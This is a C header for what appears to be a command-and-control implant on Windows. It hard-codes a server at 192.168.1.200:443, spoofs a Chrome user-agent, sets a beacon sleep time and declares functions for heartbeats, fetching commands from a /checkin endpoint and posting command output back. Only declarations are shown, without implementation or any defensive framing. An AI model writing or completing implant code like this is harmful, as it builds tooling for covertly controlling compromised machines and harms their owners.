#ifndef COMMS_H
#define COMMS_H

#include <wtypes.h>

// communication profile
#define SERVER_HOST L"192.168.1.200"
#define SERVER_PORT 443
#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0"
#define SLEEP_TIME 5000

// generate UUID, HTTP URIs etc.
void InitializeComms(void);

// POST to /heartbeat/<agent_id>
void SendHeartbeat(void);

// POST to /output/<agent_id>
void SendOutput(const char *output);

// GET from /checkin/<agent_id> → returns command string
int GetCommand(char *command, DWORD maxLen);

#endif // COMMS_H